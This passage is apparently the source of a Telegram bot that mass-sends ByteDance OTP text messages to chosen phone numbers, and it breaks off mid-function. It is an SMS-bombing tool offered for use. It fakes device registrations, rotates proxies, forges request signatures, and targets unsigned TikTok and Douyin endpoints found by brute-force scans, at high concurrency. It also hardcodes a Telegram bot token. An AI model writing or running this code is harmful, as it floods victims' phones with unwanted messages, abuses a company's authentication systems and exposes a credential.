#!/usr/bin/env python3
"""
ByteDance Multi-App OTP Telegram Bot - Ultra Fast Edition v8.0
===============================================================
Features:
1. 5-10 Concurrent OTP Requests Per Second
2. Fully Async Architecture - Zero Blocking
3. Multi-User Support - 1000+ Users Simultaneously
4. Real-time Logging Every 10 Requests
5. Time Schedule Feature for Bulk Tasks
6. Multi-App Support (Douyin, Pipix, Toutiao, Xigua, Helo + more)
7. Working SignerPy v8404 Signature Pattern
8. Device Registration + Fresh Identity Per Request
"""

import asyncio
import hashlib
import json
import logging
import os
import random
import string
import time
import uuid
import re
import io
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode
from typing import Optional, List, Dict, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from collections import defaultdict
import pytz

import requests
import urllib3
import aiohttp

urllib3.disable_warnings()
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# Import SignerPy for signature generation
try:
    import SignerPy as SP
    from SignerPy import xor
    SIGNERPY_AVAILABLE = True
except ImportError:
    SIGNERPY_AVAILABLE = False
    print("WARNING: SignerPy not available!")

# ============================================
# CONFIGURATION
# ============================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "7936435325:AAHR2T6DLYu8vt5CdrDW4IK6mlw1qXKpss0")

# Pakistan Timezone
PAKISTAN_TZ = pytz.timezone('Asia/Karachi')

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Performance settings - ULTRA FAST
MAX_CONCURRENT_OTP = 50          # 5 concurrent OTP requests at once
MAX_CONCURRENT_TASKS = 100       # Support 100+ concurrent tasks
BATCH_SIZE = 100                  # Process 5 numbers at a time
LOG_INTERVAL = 50                # Log every 5 requests
MAX_MESSAGE_LENGTH = 4000
REQUEST_TIMEOUT = 15             # 15 second timeout per request

# ============================================
# BYTEDANCE MULTI-APP DATABASE
# ============================================

# All 15 confirmed reachable tiktokv.com mobile domains
TIKTOKV_DOMAINS = [
    "api16-normal-c-alisg.tiktokv.com",
    "api-t2.tiktokv.com",
    "api-va.tiktokv.com",
    "api16-normal-c-useast2a.tiktokv.com",
    "api16-normal-c-useast1a.tiktokv.com",
    "api16-normal-useast5.us.tiktokv.com",
    "api16-normal-v4.tiktokv.com",
    "api16-normal-v6.tiktokv.com",
    "api16.tiktokv.com",
    "api19-normal-c-alisg.tiktokv.com",
    "api19-normal-c-useast1a.tiktokv.com",
    "api19-normal-c-useast2a.tiktokv.com",
    "api19-normal-useast5.us.tiktokv.com",
    "api19.tiktokv.com",
    "api21-normal-c-alisg.tiktokv.com",
    "api21-normal-c-useast2a.tiktokv.com",
]

BYTEDANCE_APPS = {
    "douyin": {
        "name": "Douyin (Chinese TikTok)", "aid": 1128, "app_name": "aweme",
        "package": "com.ss.android.ugc.aweme", "version_code": "290100", "version_name": "29.1.0",
        "channel": "update", "type_codes": [3635, 3637, 3634],
        "domains": ["api3-normal-c-lf.amemv.com", "is.snssdk.com", "api5-normal-c-lf.amemv.com"],
    },
    "douyin_lite": {
        "name": "Douyin Lite", "aid": 2329, "app_name": "aweme_lite",
        "package": "com.ss.android.ugc.aweme.lite", "version_code": "290100", "version_name": "29.1.0",
        "channel": "update", "type_codes": [3635, 3637, 3634],
        "domains": ["api3-normal-c-lf.amemv.com", "is.snssdk.com", "api5-normal-c-lf.amemv.com"],
    },
    "douyin_huoshan": {
        "name": "Douyin Huoshan", "aid": 1112, "app_name": "live_stream",
        "package": "com.ss.android.ugc.live", "version_code": "110300", "version_name": "11.3.0",
        "channel": "update", "type_codes": [3635, 3637, 3634],
        "domains": ["api3-normal-c-lf.amemv.com", "is.snssdk.com", "api5-normal-c-lf.amemv.com"],
    },
    "pipix": {
        "name": "Pipix / SuperB", "aid": 1319, "app_name": "super",
        "package": "com.sup.android.superb", "version_code": "620", "version_name": "6.2.0",
        "channel": "update", "type_codes": [3635, 3637, 3634],
        "domains": ["api5.pipix.com", "api3.pipix.com"],
    },
    "toutiao": {
        "name": "Toutiao (Headlines)", "aid": 13, "app_name": "news_article",
        "package": "com.ss.android.article.news", "version_code": "9500", "version_name": "9.5.0",
        "channel": "update", "type_codes": [3635, 3637, 3634],
        "domains": ["api3-normal-c-lf.amemv.com", "is.snssdk.com"],
    },
    "xigua": {
        "name": "Xigua Video", "aid": 32, "app_name": "video_article",
        "package": "com.ss.android.article.video", "version_code": "7500", "version_name": "7.5.0",
        "channel": "update", "type_codes": [3635, 3637, 3634],
        "domains": ["api3-normal-c-lf.amemv.com", "is.snssdk.com"],
    },
    "helo": {
        # Confirmed by user's 8676-request scan: Helo aid=1180 with app_name "musical_ly"
        # works across multiple tiktokv.com domains with type codes 3631/3632/3634/3637/3733/3734
        "name": "Helo", "aid": 1180, "app_name": "musical_ly",
        "package": "com.ss.android.ugc.helo", "version_code": "4500", "version_name": "4.5.0",
        "channel": "googleplay",
        "type_codes": [3631, 3632, 3634, 3637, 3733, 3734],
        "domains": TIKTOKV_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "tiktok": {
        # Confirmed SUCCESS on 15+ domains and 6 type codes across 8676-request scan
        "name": "TikTok Global", "aid": 1233, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3733, 3631, 3632, 3634, 3637, 3734],
        "domains": TIKTOKV_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "tiktok_lite": {
        # Confirmed SUCCESS - app_name is "trill" not "tiktok_lite"!
        "name": "TikTok Lite", "aid": 1340, "app_name": "trill",
        "package": "com.zhiliaoapp.musically.go", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3132, 3631, 3632, 3634, 3637, 3733, 3734, 3530],
        "domains": TIKTOKV_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "capcut": {
        # Confirmed SUCCESS on 4 domains with 12 working type codes
        "name": "CapCut", "aid": 3006, "app_name": "vicut",
        "package": "com.lemon.lvoverseas", "version_code": "9200400", "version_name": "9.2.0",
        "channel": "googleplay",
        "type_codes": [3731, 3631, 3132, 3634, 3733, 34, 3536, 3637, 3532, 3632, 3730, 3734],
        "domains": [
            "api16-normal-c-useast2a.tiktokv.com",
            "api19-normal-c-useast2a.tiktokv.com",
            "api21-normal-c-useast2a.tiktokv.com",
            "api19-normal-useast5.us.tiktokv.com",
        ],
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    # ======== WEB-BASED APPS (NO SIGNING NEEDED) ========
    "tiktok_web": {
        # AID=1459 on /passport/web/send_code/ — NO signatures, NO device registration!
        "name": "TikTok Web (No-Sign)", "aid": 1459, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734, 3132],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True,
        "web_endpoint": True,
    },
    "douyin_web": {
        # AID=1988 on /passport/web/send_code/ — CONFIRMED SUCCESS without any signing!
        "name": "Douyin Web (No-Sign)", "aid": 1988, "app_name": "douyin_web",
        "package": "douyin_web", "version_code": "1", "version_name": "1.0",
        "channel": "douyin_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734, 3132, 3536],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True,
        "web_endpoint": True,
    },
    "tiktok_unsigned": {
        # Mobile endpoint on tiktokv.com WITHOUT signatures — rate-limited = works
        "name": "TikTok Unsigned (No-Sign)", "aid": 1233, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3733, 3631, 3632, 3634, 3637, 3734],
        "domains": TIKTOKV_DOMAINS,
        "needs_proxy": True,
        "unsigned_mobile": True,
    },
    # ======== BRUTE FORCE DISCOVERED APPS (AID 1-10000 scan, web endpoint) ========
    "tiktok_ads_web": {
        "name": "TikTok Ads (No-Sign)", "aid": 1583, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_1760": {
        "name": "ByteDance 1760 (No-Sign)", "aid": 1760, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_2960": {
        "name": "ByteDance 2960 (No-Sign)", "aid": 2960, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_4068": {
        "name": "ByteDance 4068 (No-Sign)", "aid": 4068, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_4143": {
        "name": "ByteDance 4143 (No-Sign)", "aid": 4143, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_4174": {
        "name": "ByteDance 4174 (No-Sign)", "aid": 4174, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_5049": {
        "name": "ByteDance 5049 (No-Sign)", "aid": 5049, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_6027": {
        "name": "ByteDance 6027 (No-Sign)", "aid": 6027, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_6556": {
        "name": "ByteDance 6556 (No-Sign)", "aid": 6556, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_6849": {
        "name": "ByteDance 6849 (No-Sign)", "aid": 6849, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    "bd_8311": {
        "name": "ByteDance 8311 (No-Sign)", "aid": 8311, "app_name": "tiktok_web",
        "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
        "channel": "tiktok_web",
        "type_codes": [3635, 3733, 3631, 3637, 3634, 3734],
        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
        "needs_proxy": True, "web_endpoint": True,
    },
    # ======== SIGNED BRUTE FORCE DISCOVERED (AID 1-10000 on tiktokv.com) ========
    "bd_2658": {
        # CONFIRMED SUCCESS via signed mobile endpoint on tiktokv.com
        "name": "ByteDance 2658 (Signed)", "aid": 2658, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3637, 3634, 3631, 3733, 3734],
        "domains": TIKTOKV_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
    "bd_7743": {
        # Rate-limited = working via signed mobile endpoint on tiktokv.com
        "name": "ByteDance 7743 (Signed)", "aid": 7743, "app_name": "musical_ly",
        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
        "channel": "googleplay",
        "type_codes": [3635, 3637, 3634, 3631, 3733, 3734],
        "domains": TIKTOKV_DOMAINS,
        "register_domain": "api3-normal-c-lf.amemv.com",
        "needs_proxy": True,
    },
}

DEFAULT_APP = "pipix"

# Thread pool for blocking operations
thread_pool = ThreadPoolExecutor(max_workers=50)

# Global stats
class GlobalStats:
    def __init__(self):
        self.total_requests = 0
        self.total_success = 0
        self.total_failed = 0
        self.start_time = time.time()
        self._lock = asyncio.Lock()
    
    async def increment(self, success: bool):
        async with self._lock:
            self.total_requests += 1
            if success:
                self.total_success += 1
            else:
                self.total_failed += 1
    
    def get_stats(self) -> Dict:
        uptime = time.time() - self.start_time
        return {
            "total_requests": self.total_requests,
            "total_success": self.total_success,
            "total_failed": self.total_failed,
            "uptime_seconds": uptime,
            "requests_per_minute": (self.total_requests / uptime * 60) if uptime > 0 else 0
        }

global_stats = GlobalStats()

# ============================================
# DEVICE IDENTITY GENERATOR WITH REGISTRATION
# ============================================

class DeviceIdentityGenerator:
    """Device Identity Generator with ByteDance device registration for valid IDs"""

    DEVICE_BRANDS = {
        "Samsung": ["SM-G991B", "SM-G996B", "SM-G998B", "SM-A525F", "SM-A725F", "SM-N986B", "SM-F926B", "SM-S901B", "SM-S906B", "SM-S908B", "SM-A536B", "SM-A346B", "SM-M536B", "SM-G781B"],
        "Xiaomi": ["M2101K6G", "M2102J20SG", "M2011K2G", "M2012K11AG", "22041219G", "22071219CG", "23049PCD8G", "2201116SG", "2203121C", "22101316G"],
        "OnePlus": ["LE2111", "LE2115", "LE2121", "LE2125", "NE2213", "CPH2449", "PHB110", "CPH2487", "NE2210", "LE2101"],
        "OPPO": ["CPH2145", "CPH2207", "CPH2247", "CPH2305", "CPH2371", "CPH2387", "CPH2451", "CPH2473", "CPH2493", "CPH2525"],
        "Vivo": ["V2111", "V2130", "V2145", "V2154", "V2185", "V2203", "V2217", "V2227", "V2241", "V2254"],
        "Realme": ["RMX3085", "RMX3161", "RMX3195", "RMX3241", "RMX3286", "RMX3370", "RMX3393", "RMX3474", "RMX3521", "RMX3630"],
        "Huawei": ["ELS-NX9", "NOH-NX9", "JAD-LX9", "OCE-AN10", "ANA-NX9", "LIO-N29", "TET-AN00", "ABR-AL80", "DCO-AL00", "NAM-AL00"],
        "Google": ["Pixel 6", "Pixel 6 Pro", "Pixel 7", "Pixel 7 Pro", "Pixel 8", "Pixel 8 Pro", "Pixel 6a", "Pixel 7a", "Pixel 8a", "Pixel Fold"],
        "Motorola": ["XT2175-2", "XT2201-2", "XT2225-1", "XT2237-2", "XT2251-1", "XT2301-4", "XT2343-1", "XT2361-3", "XT2381-3", "XT2401-3"],
        "Itel": ["itel S685LN", "itel A665L", "itel P55", "itel S23", "itel A70", "itel P40", "itel S18", "itel A60", "itel P65", "itel S24"],
        "Infinix": ["X6831", "X6711", "X6871", "X6833B", "X6739", "X6710", "X6837", "X6525", "X6528", "X6826"],
        "Tecno": ["CK7n", "CK8n", "CK9n", "CH9n", "CL8", "CL7n", "CK6n", "CH7n", "CK8", "CL6"],
    }

    ANDROID_VERSIONS = ["12", "13", "14"]
    API_LEVELS = {"12": "31", "13": "33", "14": "34"}

    BUILD_IDS = [
        "TQ3A.230901.001", "UP1A.231005.007", "AP3A.240905.015", "BP1A.250305.019",
    ]

    CRONET_VERSIONS = ["b714bfef_2024-09-13", "02785bc3_2023-06-20", "03896cd4_2023-09-15"]

    def __init__(self):
        self.generation_count = 0
        self._lock = asyncio.Lock()
        self.app = BYTEDANCE_APPS[DEFAULT_APP]

    def set_app(self, app_key: str):
        """Set which ByteDance app to register devices for"""
        app_key = app_key.lower()
        if app_key in BYTEDANCE_APPS:
            self.app = BYTEDANCE_APPS[app_key]

    def _register_device(self, brand: str, model: str, android_version: str,
                         api_level: str, build_id: str, resolution: str,
                         dpi: str, openudid: str, cdid: str,
                         proxy: Optional[str] = None) -> Optional[Dict]:
        """Register device with ByteDance server to get valid device_id and install_id"""
        timestamp = int(time.time())
        app = self.app
        domain = app.get("register_domain", app["domains"][0])
        register_params = {
            "aid": str(app["aid"]), "app_name": app["app_name"],
            "version_code": app["version_code"], "version_name": app["version_name"],
            "device_platform": "android", "os": "android",
            "os_api": api_level, "os_version": android_version,
            "device_type": model, "device_brand": brand,
            "language": "en", "ac": "wifi", "channel": app["channel"],
            "resolution": resolution, "dpi": dpi,
            "openudid": openudid, "cdid": cdid,
            "update_version_code": app["version_code"],
            "manifest_version_code": app["version_code"],
            "ts": str(timestamp), "_rticket": str(timestamp * 1000),
        }
        body = json.dumps({
            "magic_tag": "ss_app_log",
            "header": {
                "display_name": app["name"],
                "update_version_code": int(app["version_code"]),
                "manifest_version_code": int(app["version_code"]),
                "aid": app["aid"], "channel": app["channel"],
                "package": app["package"], "app_version": app["version_name"],
                "version_code": int(app["version_code"]),
                "sdk_version": "2.14.0-rc.8",
                "os": "Android", "os_version": android_version, "os_api": int(api_level),
                "device_model": model, "device_brand": brand,
                "device_manufacturer": brand, "cpu_abi": "arm64-v8a",
                "release_build": "f66b21c_20241009",
                "density_dpi": int(dpi), "display_density": "xxhdpi",
                "resolution": resolution.replace("*", "x"),
                "language": "en", "timezone": 5, "access": "wifi",
                "not_request_sender": 0, "rom": build_id,
                "rom_version": f"android{android_version}-release",
                "cdid": cdid, "sig_hash": "aea615ab", "openudid": openudid,
                "clientudid": str(uuid.uuid4()), "region": "US",
                "tz_name": "Asia/Karachi", "tz_offset": 18000, "sim_region": "pk",
            },
            "_gen_ts": timestamp,
        })
        url = f"https://{domain}/service/2/device_register/?{urlencode(register_params)}"
        ua = f"{app['package']}/{app['version_code']} (Linux; U; Android {android_version}; en_US; {model}; Build/{build_id}; Cronet/TTNetVersion:b714bfef 2024-09-13 QuicVersion:c459d547 2024-08-27)"
        headers = {
            "Host": domain, "User-Agent": ua,
            "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate",
        }
        session = requests.Session()
        if proxy:
            if not proxy.startswith("http") and not proxy.startswith("socks"):
                proxy = f"http://{proxy}"
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.post(url, data=body, headers=headers, verify=False, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "device_id": str(data["device_id"]),
                    "iid": str(data["install_id"]),
                }
        except Exception as e:
            logger.warning(f"Device registration failed: {e}")
        finally:
            session.close()
        return None

    def generate_fresh_identity(self, proxy: Optional[str] = None) -> Dict:
        """Generate a fresh device identity with server-registered device_id/iid"""
        self.generation_count += 1

        brand = random.choice(list(self.DEVICE_BRANDS.keys()))
        model = random.choice(self.DEVICE_BRANDS[brand])
        android_version = random.choice(self.ANDROID_VERSIONS)
        api_level = self.API_LEVELS[android_version]
        build_id = random.choice(self.BUILD_IDS)
        cronet_version = random.choice(self.CRONET_VERSIONS)

        resolutions = ["1080*2400", "1080*2340", "1080*2282", "1440*3200", "1080*2520"]
        resolution = random.choice(resolutions)
        dpi = random.choice(["420", "480", "560"])

        openudid = ''.join(random.choices('0123456789abcdef', k=16))
        cdid = str(uuid.uuid4())
        odin_tt = ''.join(random.choices('0123456789abcdef', k=160))
        csrf_token = ''.join(random.choices('0123456789abcdef', k=32))

        # Register device to get valid device_id and install_id
        reg = self._register_device(
            brand, model, android_version, api_level,
            build_id, resolution, dpi, openudid, cdid, proxy
        )
        if reg:
            device_id = reg["device_id"]
            iid = reg["iid"]
        else:
            # Fallback to random IDs (may get 403)
            device_id = ''.join(random.choices(string.digits, k=16))
            iid = ''.join(random.choices(string.digits, k=16))
            logger.warning("Device registration failed, using random IDs (may get 403)")

        return {
            "device_id": device_id, "iid": iid, "openudid": openudid, "cdid": cdid,
            "device_type": model, "device_brand": brand,
            "os_api": api_level, "os_version": android_version,
            "resolution": resolution, "dpi": dpi,
            "build_id": build_id, "cronet_version": cronet_version,
            "odin_tt": odin_tt, "csrf_token": csrf_token,
            "generation_number": self.generation_count,
        }

    def get_stats(self) -> Dict:
        return {
            "total_generated": self.generation_count,
        }


# ============================================
# BYTEDANCE MULTI-APP OTP SENDER
# ============================================

class ByteDanceOTPSender:
    """Multi-App OTP Sender - Works with any ByteDance app via v8404 signature"""

    ENDPOINT = "/passport/mobile/send_code/v1/"

    def __init__(self, identity_generator: DeviceIdentityGenerator, app_key: str = DEFAULT_APP):
        self.identity_generator = identity_generator
        self.current_identity = None
        self.set_app(app_key)

    def set_app(self, app_key: str):
        """Switch to a different ByteDance app"""
        app_key = app_key.lower()
        if app_key not in BYTEDANCE_APPS:
            app_key = DEFAULT_APP
        self.app = BYTEDANCE_APPS[app_key]
        self.app_key = app_key
        self.identity_generator.set_app(app_key)

    def _create_session(self, proxy: Optional[str] = None) -> requests.Session:
        session = requests.Session()
        if proxy:
            if not proxy.startswith("http") and not proxy.startswith("socks"):
                proxy = f"http://{proxy}"
            session.proxies = {"http": proxy, "https": proxy}
        return session

    def refresh_identity(self, proxy: Optional[str] = None) -> Dict:
        self.current_identity = self.identity_generator.generate_fresh_identity(proxy=proxy)
        return self.current_identity

    def _get_config(self) -> Dict:
        if not self.current_identity:
            self.refresh_identity()
        config = {
            "app_name": self.app["app_name"], "aid": self.app["aid"],
            "version_code": self.app["version_code"], "version_name": self.app["version_name"],
            "manifest_version_code": self.app["version_code"],
            "update_version_code": self.app["version_code"],
            "passport_sdk_version": "50559",
            "os": "android", "device_platform": "android",
            "channel": self.app["channel"], "carrier_region": "PK",
            "language": "en", "ac": "wifi", "ssmix": "a",
            "device_id": self.current_identity["device_id"],
            "iid": self.current_identity["iid"],
            "cdid": self.current_identity["cdid"],
            "device_type": self.current_identity["device_type"],
            "device_brand": self.current_identity["device_brand"],
            "os_api": self.current_identity["os_api"],
            "os_version": self.current_identity["os_version"],
            "resolution": self.current_identity["resolution"],
            "dpi": self.current_identity["dpi"],
        }
        return config

    def _get_cookies(self) -> Dict:
        if not self.current_identity:
            self.refresh_identity()
        return {
            "odin_tt": self.current_identity["odin_tt"],
            "install_id": self.current_identity["iid"],
            "passport_csrf_token_default": self.current_identity["csrf_token"],
        }

    def _encrypt_phone(self, phone_number: str) -> str:
        if SIGNERPY_AVAILABLE:
            return xor(phone_number)
        encrypted = ""
        for char in phone_number:
            encrypted_byte = ord(char) ^ 5
            encrypted += format(encrypted_byte, '02x')
        return encrypted

    def _build_common_params(self, config: Dict) -> Dict:
        """Common params shared between URL and body"""
        return {
            "passport-sdk-version": config["passport_sdk_version"],
            "iid": config["iid"], "device_id": config["device_id"],
            "ac": config["ac"], "channel": config["channel"],
            "aid": str(config["aid"]), "app_name": config["app_name"],
            "version_code": config["version_code"], "version_name": config["version_name"],
            "device_platform": config["device_platform"], "os": config["os"],
            "ssmix": config["ssmix"], "device_type": config["device_type"],
            "device_brand": config["device_brand"], "language": config["language"],
            "os_api": config["os_api"], "os_version": config["os_version"],
            "manifest_version_code": config["manifest_version_code"],
            "resolution": config["resolution"], "dpi": config["dpi"],
            "update_version_code": config["update_version_code"],
            "cdid": config["cdid"],
            "carrier_region": config["carrier_region"],
        }

    def _build_url_params(self, config: Dict, timestamp: int) -> str:
        rticket = str(timestamp * 1000 + random.randint(1000, 9999))
        params = self._build_common_params(config)
        params["_rticket"] = rticket
        params["ts"] = str(timestamp)
        return urlencode(params)

    def _build_body(self, phone_number: str, config: Dict, timestamp: int, type_code: Optional[int] = None) -> str:
        encrypted_mobile = self._encrypt_phone(phone_number)
        rticket = str(timestamp * 1000 + random.randint(1000, 9999))
        params = self._build_common_params(config)
        if type_code is None:
            codes = self.app.get("type_codes") or [self.app.get("type_code", 3635)]
            type_code = random.choice(codes)
        params.update({
            "auto_read": "0", "account_sdk_source": "app",
            "unbind_exist": "35", "mix_mode": "1",
            "mobile": encrypted_mobile,
            "type": str(type_code),
            "_rticket": rticket, "ts": str(timestamp),
        })
        return urlencode(params)

    def _build_cookie_string(self, cookies: Dict) -> str:
        return "; ".join([f"{k}={v}" for k, v in cookies.items()])

    def _generate_signatures(self, url_params: str, body: str, cookie_str: str, config: Dict) -> Dict:
        if not SIGNERPY_AVAILABLE:
            raise Exception("SignerPy library not available!")
        return SP.sign(
            params=url_params,
            payload=body,
            cookie=cookie_str,
            version=8404,
            aid=config["aid"],
        )

    def _build_headers(self, config: Dict, cookies: Dict, timestamp: int, signatures: Dict, body: str, domain: str = None) -> Dict:
        rticket = str(timestamp * 1000 + random.randint(1000, 9999))
        cookie_str = self._build_cookie_string(cookies)
        build_id = self.current_identity.get("build_id", "UP1A.231005.007")
        cronet_tag = self.current_identity.get("cronet_version", "b714bfef_2024-09-13")
        cronet_parts = cronet_tag.split("_") if "_" in cronet_tag else [cronet_tag, "2024-09-13"]

        host = domain or self.app["domains"][0]
        return {
            "Host": host,
            "Connection": "keep-alive",
            "Content-Length": str(len(body)),
            "Cookie": cookie_str,
            "x-tt-passport-csrf-token": cookies.get("passport_csrf_token_default", ""),
            "X-SS-REQ-TICKET": rticket,
            "x-vc-bdturing-sdk-version": "3.7.2.cn",
            "sdk-version": "2",
            "passport-sdk-version": config["passport_sdk_version"],
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-SS-DP": str(config["aid"]),
            "User-Agent": f"{self.app['package']}/{config['version_code']} (Linux; U; Android {config['os_version']}; en_US; {config['device_type']}; Build/{build_id}; Cronet/TTNetVersion:{cronet_parts[0]} {cronet_parts[1]} QuicVersion:c459d547 2024-08-27)",
            "Accept-Encoding": "gzip, deflate",
            "X-Gorgon": signatures.get("x-gorgon", ""),
            "X-Khronos": signatures.get("x-khronos", str(timestamp)),
            "X-Argus": signatures.get("x-argus", ""),
            "X-Ladon": signatures.get("x-ladon", ""),
            "X-SS-STUB": signatures.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper()),
        }

    def _send_web_endpoint(self, phone: str, proxy: Optional[str] = None) -> Dict:
        """Web-based OTP send — NO signing, NO device registration needed!"""
        start_time = time.time()
        encrypted = self._encrypt_phone(phone)
        domain = random.choice(self.app["domains"])
        codes = self.app.get("type_codes") or [3635]
        tc = random.choice(codes)

        body = urlencode({
            "mobile": encrypted, "type": str(tc),
            "aid": str(self.app["aid"]), "app_name": self.app["app_name"],
            "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0",
        })
        url = f"https://{domain}/passport/web/send_code/?aid={self.app['aid']}&app_name={self.app['app_name']}"
        headers = {
            "Host": domain,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": f"https://{domain}",
            "Referer": f"https://{domain}/",
            "X-SS-DP": str(self.app["aid"]),
        }
        session = self._create_session(proxy)
        try:
            response = session.post(url, data=body, headers=headers, verify=False, timeout=REQUEST_TIMEOUT)
            elapsed = (time.time() - start_time) * 1000
            try:
                result = response.json()
                result["success"] = result.get("message") == "success"
                result["proxy_used"] = proxy or "Direct"
                result["method"] = "web_unsigned"
                result["domain"] = domain
                result["time_ms"] = elapsed
                result["phone"] = phone
                return result
            except json.JSONDecodeError:
                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"error": str(e), "success": False, "time_ms": elapsed, "phone": phone}
        finally:
            session.close()

    def _send_unsigned_mobile(self, phone: str, proxy: Optional[str] = None) -> Dict:
        """Mobile endpoint WITHOUT signatures — works on tiktokv.com domains!"""
        start_time = time.time()
        encrypted = self._encrypt_phone(phone)
        domain = random.choice(self.app["domains"])
        codes = self.app.get("type_codes") or [3635]
        tc = random.choice(codes)
        timestamp = int(time.time())
        device_id = str(random.randint(10**15, 10**16-1))
        iid = str(random.randint(10**15, 10**16-1))

        common_params = {
            "aid": str(self.app["aid"]), "app_name": self.app["app_name"],
            "version_code": self.app["version_code"], "version_name": self.app["version_name"],
            "device_platform": "android", "os": "android",
            "device_id": device_id, "iid": iid,
            "ssmix": "a", "carrier_region": "US",
            "passport-sdk-version": "50559",
            "ts": str(timestamp), "_rticket": str(timestamp * 1000),
        }
        body_params = dict(common_params)
        body_params.update({
            "mobile": encrypted, "type": str(tc),
            "auto_read": "0", "account_sdk_source": "app",
            "unbind_exist": "35", "mix_mode": "1",
        })
